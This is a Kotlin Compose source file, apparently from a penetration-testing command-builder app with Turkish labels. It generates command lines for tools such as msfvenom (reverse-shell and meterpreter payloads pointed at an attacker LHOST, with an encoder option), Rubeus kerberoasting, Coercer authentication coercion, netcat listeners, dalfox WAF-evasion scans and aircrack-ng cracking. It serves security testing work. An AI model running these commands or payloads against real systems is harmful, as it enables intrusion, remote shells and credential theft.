        OutlinedTextField(value = binFile, onValueChange = { binFile = it }, label = { Text("Binary Dosya") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("-I" to "Bilgiler (-I)", "-z" to "Stringler (-z)", "-i" to "Imports (-i)", "-E" to "Exports (-E)").forEach { (m, lbl) ->
                val sel = mode == m
                Box(modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp), contentAlignment = Alignment.Center) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextSecondary)
                }
            }
        }
        val cmd = "rabin2 $mode $binFile"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun BinwalkBuilder(language: AppLanguage) {
    var firmwareFile by remember { mutableStateOf("firmware.bin") }
    var extract by remember { mutableStateOf(true) }
    Column {
        OutlinedTextField(value = firmwareFile, onValueChange = { firmwareFile = it }, label = { Text("Firmware / İkili Dosya") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-e Otomatik Çıkart (Extract)", checked = extract, onCheckedChange = { extract = it })
        val cmd = "binwalk " + (if (extract) "-e -M " else "") + firmwareFile
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun ExifToolBuilder(language: AppLanguage) {
    var file by remember { mutableStateOf("document.pdf") }
    Column {
        OutlinedTextField(value = file, onValueChange = { file = it }, label = { Text("Hedef Dosya (Görsel, PDF vb.)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        val cmd = "exiftool $file"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun VolatilityBuilder(language: AppLanguage) {
    var memFile by remember { mutableStateOf("memory.raw") }
    var plugin by remember { mutableStateOf("windows.pslist") }
    Column {
        OutlinedTextField(value = memFile, onValueChange = { memFile = it }, label = { Text("RAM İmajı (-f)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("windows.pslist" to "Süreçler (pslist)", "windows.netscan" to "Ağ Bağlantıları", "windows.malfind" to "Zararlı Enjeksiyonu", "windows.hashdump" to "Hash Dump").forEach { (plg, lbl) ->
                val sel = plugin == plg
                Box(modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { plugin = plg }.padding(horizontal = 8.dp, vertical = 5.dp)) {
                    Text(text = "$plg ($lbl)", fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (sel) CyberGreen else TextPrimary)
                }
            }
        }
        val cmd = "vol -f $memFile $plugin"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun MsfvenomBuilder(language: AppLanguage) {
    var platform by remember { mutableStateOf("windows_x64") }
    var lhost by remember { mutableStateOf("10.10.14.5") }
    var lport by remember { mutableStateOf("4444") }
    var format by remember { mutableStateOf("exe") }
    var outputFile by remember { mutableStateOf("payload.exe") }
    var enableEncoder by remember { mutableStateOf(false) }

    Column {
        Row(modifier = Modifier.fillMaxWidth().horizontalScroll(rememberScrollState()), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf(
                "windows_x64" to "Windows x64 (.exe)",
                "windows_x86" to "Windows x86 (.exe)",
                "linux_x64" to "Linux x64 (.elf)",
                "php" to "PHP (.php)",
                "aspx" to "ASPX (.aspx)",
                "android" to "Android (.apk)",
                "war" to "Java WAR (.war)"
            ).forEach { (plat, lbl) ->
                val selected = platform == plat
                Box(
                    modifier = Modifier.clip(RoundedCornerShape(6.dp)).background(if (selected) ExploitRed.copy(alpha = 0.2f) else SurfaceVariantDark).border(1.dp, if (selected) ExploitRed else BorderDark, RoundedCornerShape(6.dp)).clickable {
                        platform = plat
                        when (plat) {
                            "windows_x64" -> { format = "exe"; outputFile = "shell64.exe" }
                            "windows_x86" -> { format = "exe"; outputFile = "shell32.exe" }
                            "linux_x64" -> { format = "elf"; outputFile = "shell.elf" }
                            "php" -> { format = "raw"; outputFile = "shell.php" }
                            "aspx" -> { format = "aspx"; outputFile = "shell.aspx" }
                            "android" -> { format = "apk"; outputFile = "shell.apk" }
                            "war" -> { format = "war"; outputFile = "shell.war" }
                        }
                    }.padding(horizontal = 8.dp, vertical = 5.dp)
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) ExploitRed else TextPrimary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(value = lhost, onValueChange = { lhost = it }, label = { Text("LHOST") }, modifier = Modifier.weight(1.5f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = lport, onValueChange = { lport = it }, label = { Text("LPORT") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        val fullPayload = when (platform) {
            "windows_x64" -> "windows/x64/meterpreter/reverse_tcp"
            "windows_x86" -> "windows/meterpreter/reverse_tcp"
            "linux_x64" -> "linux/x64/shell_reverse_tcp"
            "php" -> "php/reverse_php"
            "aspx" -> "windows/shell_reverse_tcp"
            "android" -> "android/meterpreter/reverse_tcp"
            "war" -> "java/jsp_shell_reverse_tcp"
            else -> "windows/x64/meterpreter/reverse_tcp"
        }
        ToggleOption(label = "Encoder Ekle (-e x86/shikata_ga_nai -i 3)", checked = enableEncoder, onCheckedChange = { enableEncoder = it })

        val cmd = "msfvenom -p $fullPayload LHOST=$lhost LPORT=$lport -f $format" + (if (enableEncoder) " -e x86/shikata_ga_nai -i 3" else "") + " -o $outputFile"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun SubfinderBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("example.com") }
    var allSources by remember { mutableStateOf(true) }
    var recursive by remember { mutableStateOf(false) }
    var silent by remember { mutableStateOf(false) }
    var outputFile by remember { mutableStateOf("subdomains.txt") }
    var enableOutput by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Hedef Domain (-d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-all Tüm Pasif Kaynakları Kullan", checked = allSources, onCheckedChange = { allSources = it })
        ToggleOption(label = "-recursive Alt Alan Adlarını Özyinelemeli Tara", checked = recursive, onCheckedChange = { recursive = it })
        ToggleOption(label = "-silent Yalnızca Sonuçları Ekrana Bas", checked = silent, onCheckedChange = { silent = it })
        ToggleOption(label = "-o $outputFile Çıktıyı Dosyaya Yaz", checked = enableOutput, onCheckedChange = { enableOutput = it })

        val parts = mutableListOf("subfinder", "-d", domain.trim())
        if (allSources) parts.add("-all")
        if (recursive) parts.add("-recursive")
        if (silent) parts.add("-silent")
        if (enableOutput) parts.addAll(listOf("-o", outputFile))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

@Composable
fun AmassBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("example.com") }
    var mode by remember { mutableStateOf("passive") }
    var bruteForce by remember { mutableStateOf(false) }
    var outputFile by remember { mutableStateOf("amass_results.txt") }

    Column {
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Hedef Domain (-d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("passive" to "-passive (Sessiz İstihbarat)", "active" to "-active (Doğrudan Sorgu)").forEach { (m, lbl) ->
                val selected = mode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (selected) TerminalCyan.copy(alpha = 0.15f) else SurfaceDark).border(1.dp, if (selected) TerminalCyan else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 10.5.sp, fontFamily = FontFamily.Monospace, color = if (selected) TerminalCyan else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-brute DNS Kaba Kuvvet Taraması", checked = bruteForce, onCheckedChange = { bruteForce = it })

        val parts = mutableListOf("amass", "enum")
        if (mode == "passive") parts.add("-passive") else parts.add("-active")
        parts.addAll(listOf("-d", domain.trim()))
        if (bruteForce) parts.add("-brute")
        parts.addAll(listOf("-o", outputFile))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

@Composable
fun HttpxBuilder(language: AppLanguage) {
    var targetList by remember { mutableStateOf("hosts.txt") }
    var showTitle by remember { mutableStateOf(true) }
    var showTech by remember { mutableStateOf(true) }
    var showStatusCode by remember { mutableStateOf(true) }
    var followRedirects by remember { mutableStateOf(true) }
    var threads by remember { mutableStateOf("50") }
    var outputFile by remember { mutableStateOf("live_hosts.txt") }

    Column {
        OutlinedTextField(value = targetList, onValueChange = { targetList = it }, label = { Text("Hedef Dosyası (-l) veya URL (-u)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-title Sayfa Başlığını Çek", checked = showTitle, onCheckedChange = { showTitle = it })
        ToggleOption(label = "-tech-detect Teknolojileri Belirle (Wappalyzer)", checked = showTech, onCheckedChange = { showTech = it })
        ToggleOption(label = "-status-code Yanıt Kodunu Göster (200, 301, 403)", checked = showStatusCode, onCheckedChange = { showStatusCode = it })
        ToggleOption(label = "-follow-redirects Yönlendirmeleri Takip Et", checked = followRedirects, onCheckedChange = { followRedirects = it })

        val parts = mutableListOf("httpx")
        if (targetList.startsWith("http://") || targetList.startsWith("https://")) {
            parts.addAll(listOf("-u", targetList.trim()))
        } else {
            parts.addAll(listOf("-l", targetList.trim()))
        }
        if (showTitle) parts.add("-title")
        if (showTech) parts.add("-tech-detect")
        if (showStatusCode) parts.add("-status-code")
        if (followRedirects) parts.add("-follow-redirects")
        parts.addAll(listOf("-threads", threads, "-o", outputFile))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

@Composable
fun NucleiBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("https://example.com") }
    var severity by remember { mutableStateOf("critical,high") }
    var rateLimit by remember { mutableStateOf("150") }
    var silent by remember { mutableStateOf(false) }
    var outputFile by remember { mutableStateOf("nuclei_findings.txt") }

    Column {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef URL (-u) veya Liste (-l)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = severity, onValueChange = { severity = it }, label = { Text("Kritiklik Filtresi (-s: critical,high,medium,low,info)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-silent Sadece Bulguları Ekrana Bas", checked = silent, onCheckedChange = { silent = it })

        val flag = if (target.startsWith("http://") || target.startsWith("https://")) "-u" else "-l"
        val cmd = "nuclei $flag $target -s $severity -rl $rateLimit" + (if (silent) " -silent" else "") + " -o $outputFile"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun ArjunBuilder(language: AppLanguage) {
    var url by remember { mutableStateOf("https://target.com/endpoint") }
    var method by remember { mutableStateOf("GET") }
    var stable by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = url, onValueChange = { url = it }, label = { Text("Hedef URL (-u)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("GET", "POST", "JSON").forEach { m ->
                val selected = method == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (selected) CyberGreen.copy(alpha = 0.15f) else SurfaceDark).border(1.dp, if (selected) CyberGreen else BorderDark, RoundedCornerShape(6.dp)).clickable { method = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = m, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) CyberGreen else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--stable Hata Oranını Azaltmak İçin Gecikme Ekle", checked = stable, onCheckedChange = { stable = it })

        val cmd = "arjun -u $url -m $method" + if (stable) " --stable" else ""
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun DalfoxBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("https://target.com/test.php?id=1") }
    var deepDom by remember { mutableStateOf(true) }
    var wafEvasion by remember { mutableStateOf(true) }

    Column {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef URL (url)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--deep-domxss Derin DOM XSS Taraması", checked = deepDom, onCheckedChange = { deepDom = it })
        ToggleOption(label = "--waf-evasion WAF Atlama Payloadları", checked = wafEvasion, onCheckedChange = { wafEvasion = it })

        val cmd = "dalfox url $target" + (if (deepDom) " --deep-domxss" else "") + (if (wafEvasion) " --waf-evasion" else "")
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun CoercerBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.10") }
    var listener by remember { mutableStateOf("10.10.14.5") }
    var user by remember { mutableStateOf("domain_user") }
    var pass by remember { mutableStateOf("Password123!") }
    var domain by remember { mutableStateOf("corp.local") }
    var mode by remember { mutableStateOf("coerce") }

    Column {
        OutlinedTextField(value = target, onValueChange = { target = it }, label = { Text("Hedef DC IP (-t)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(value = listener, onValueChange = { listener = it }, label = { Text("Dinleyici / Responder IP (-l)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            OutlinedTextField(value = user, onValueChange = { user = it }, label = { Text("Kullanıcı (-u)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            OutlinedTextField(value = pass, onValueChange = { pass = it }, label = { Text("Parola (-p)") }, modifier = Modifier.weight(1f), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("Domain (-d)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = "coercer $mode -t $target -l $listener -u $user -p '$pass' -d $domain"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun RubeusBuilder(language: AppLanguage) {
    var action by remember { mutableStateOf("kerberoast") }
    var domain by remember { mutableStateOf("corp.local") }
    var user by remember { mutableStateOf("") }
    var noWrap by remember { mutableStateOf(true) }
    var outputFile by remember { mutableStateOf("hashes.txt") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("kerberoast" to "Kerberoast", "asreproast" to "AS-REP Roast", "tgtdeleg" to "TGT Deleg").forEach { (act, lbl) ->
                val selected = action == act
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (selected) AccentPurple.copy(alpha = 0.2f) else SurfaceDark).border(1.dp, if (selected) AccentPurple else BorderDark, RoundedCornerShape(6.dp)).clickable { action = act }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (selected) AccentPurple else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        OutlinedTextField(value = domain, onValueChange = { domain = it }, label = { Text("/domain:corp.local") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "/nowrap (Hashleri tek satırda biçimlendir)", checked = noWrap, onCheckedChange = { noWrap = it })

        val parts = mutableListOf("Rubeus.exe", action)
        if (domain.isNotBlank()) parts.add("/domain:$domain")
        if (user.isNotBlank()) parts.add("/user:$user")
        if (noWrap) parts.add("/nowrap")
        parts.add("/outfile:$outputFile")

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

@Composable
fun NetcatBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("listen") }
    var ip by remember { mutableStateOf("10.10.14.5") }
    var port by remember { mutableStateOf("4444") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("listen" to "Dinleyici (-lvnp)", "connect" to "Bağlan (-nv)").forEach { (m, lbl) ->
                val selected = mode == m
                Box(
                    modifier = Modifier.weight(1f).clip(RoundedCornerShape(6.dp)).background(if (selected) TerminalCyan.copy(alpha = 0.15f) else SurfaceDark).border(1.dp, if (selected) TerminalCyan else BorderDark, RoundedCornerShape(6.dp)).clickable { mode = m }.padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) { Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (selected) TerminalCyan else TextSecondary) }
            }
        }
        Spacer(modifier = Modifier.height(8.dp))
        if (mode == "connect") {
            OutlinedTextField(value = ip, onValueChange = { ip = it }, label = { Text("Hedef IP") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
            Spacer(modifier = Modifier.height(6.dp))
        }
        OutlinedTextField(value = port, onValueChange = { port = it }, label = { Text("Port") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = if (mode == "listen") "nc -lvnp $port" else "nc -nv $ip $port"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun AircrackNgBuilder(language: AppLanguage) {
    var capFile by remember { mutableStateOf("wpa-handshake.cap") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/rockyou.txt") }
    var bssid by remember { mutableStateOf("00:11:22:33:44:55") }

    Column {
        OutlinedTextField(value = capFile, onValueChange = { capFile = it }, label = { Text("Yakalama Dosyası (.cap / .pcap)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(value = wordlist, onValueChange = { wordlist = it }, label = { Text("Kelime Listesi (-w)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(value = bssid, onValueChange = { bssid = it }, label = { Text("Hedef BSSID (-b)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)

        val cmd = "aircrack-ng -w $wordlist -b $bssid $capFile"
        GeneratedCommandCard(command = cmd, language = language)
    }
}

@Composable
fun GitleaksBuilder(language: AppLanguage) {
    var sourcePath by remember { mutableStateOf(".") }
    var verbose by remember { mutableStateOf(true) }
    var redact by remember { mutableStateOf(true) }
    var reportPath by remember { mutableStateOf("gitleaks-report.json") }

    Column {
        OutlinedTextField(value = sourcePath, onValueChange = { sourcePath = it }, label = { Text("Depo / Klasör Yolu (--source)") }, modifier = Modifier.fillMaxWidth(), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary), singleLine = true)
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "-v Ayrıntılı Çıktı (Verbose)", checked = verbose, onCheckedChange = { verbose = it })
        ToggleOption(label = "--redact Hassas Anahtarları Ekranda Maskele", checked = redact, onCheckedChange = { redact = it })

        val parts = mutableListOf("gitleaks", "detect", "--source", sourcePath)
        if (verbose) parts.add("-v")
        if (redact) parts.add("--redact")
        parts.addAll(listOf("--report-path", reportPath))

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}
